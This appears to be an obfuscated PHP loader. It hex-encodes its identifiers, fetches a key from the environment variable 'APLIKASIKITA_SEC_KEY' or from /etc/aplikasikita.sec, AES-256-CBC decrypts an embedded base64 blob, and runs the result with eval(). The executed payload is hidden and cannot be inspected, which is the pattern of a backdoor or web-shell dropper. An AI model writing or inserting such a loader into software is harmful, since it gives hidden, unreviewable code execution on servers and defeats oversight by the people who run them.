<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('zDlJMCKwdEPVmR2rafI8aw==');

$c=base64_decode(

'AxCkKhPy4xPZnUNQZofUlN2MHWiV/5rulJR4JEzpJTCPZts9MUJSqKq6WixwKK2MmJDzaRg8zkeg' .
'rHXfR8flz4pYLyXLBUIkPNfj30npokqP7O0aWjtTH35GfFqdfpqcLKxo0D4rDOoHwsqywQu2CV1p' .
'Rg7C7MOZ2M3t4NFPFVBao9A8B8NbHWq+15XyqTGJH9szVrgKF3E1kId2BZwyX0/RRcT9Sa/Vuut3' .
's8ktMYVFtRIKroiRxLixpCR0tHMZte1pTl011tvQvekhNWRvjaYlmzNJ8ObllU66AfZFologvc3g' .
'roSCOsqzxtFCsIeDqqhfkz1iTHPPchhTH7Q3Xjks8lLFR59meMEst0DPYq5GAeSTvvqzF+MB0M8B' .
'EHjcmEf9ZQx1v2DkK4CWEaaV012WWSr483GYgTlpFgjOw4kXH824oTC5AoGa+x4t3Yfbq2HTMqwI' .
'LcWSXslz7L+LU5mO4HhBmHAAoXa0HOKnsy7x+ftx8hlmUbgHpEo0Nx6da2rwda764bXKW5+2hxky' .
'stiqg9PRBsSSMXv9MXkS/WXamIjPx0cveGd9Wj6Ru4fvpH3z+g0mi1GB2s7t+eUQfyMII5KzQNN3' .
'1fXKaRP7Aojf7MM1HjbnlBDEEE+jAc0hq5UZlbnyw1OW3nYD6sfSEiSELAJqBYWeggZTX+I9LsVE' .
'HLnphNPnK4xOGiPGGIny44VKs1Q8vTK+yuNbvZrucw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

